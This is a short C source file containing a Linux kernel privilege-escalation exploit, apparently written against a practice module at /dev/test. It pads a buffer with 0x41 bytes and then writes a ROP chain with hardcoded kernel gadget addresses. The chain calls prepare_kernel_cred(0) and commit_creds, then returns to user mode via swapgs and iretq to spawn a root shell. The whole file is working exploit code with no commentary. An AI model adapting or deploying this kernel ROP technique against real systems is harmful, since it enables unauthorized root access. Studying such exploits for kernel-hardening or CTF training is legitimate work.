#include "../fitz.h"
#include <stdio.h>

void *(*commit_creds)(void *) = 0xffffffff8108e9f0;
void *(*prepare_kernel_cred)(void *) = 0xffffffff8108ec20;

struct trapFrame tf;

int main(){
    void *pop_rdi = 0xffffffff813fb9bc;
    void *pop_rcx = 0xffffffff813f4eca;
    void *mov_rdi_rax = 0xffffffff81b2413b;

    void *swapgs = 0xffffffff81c00f58;
    void *iretq = 0xffffffff810252b2;

    int fd;
    long long rop[20] = { 0, };

    fd = openModule("/dev/test");
    prepTF64();

    tf.user_rip = getShell;
    long long *gadget = ROPretUser64(tf, swapgs, iretq);

    rop[0] = 0x4141414141414141;
    rop[1] = 0x4141414141414141;
    rop[2] = 0x4141414141414141;
    rop[3] = 0x4141414141414141;

    rop[4] = pop_rdi;
    rop[5] = 0x0000000000000000;
    rop[6] = prepare_kernel_cred;
    rop[7] = pop_rcx;
    rop[8] = 0x0000000000000000;
    rop[9] = mov_rdi_rax;

    rop[10] = commit_creds;
    rop[11] = gadget[0];   // swapgs; ret;
    rop[12] = gadget[1];   // iretq; ret;
    rop[13] = gadget[2];
    rop[14] = gadget[3];
    rop[15] = gadget[4];
    rop[16] = gadget[5];
    rop[17] = gadget[6];

    write(fd, rop,  sizeof(rop));

    close(fd);

    return 0;
}

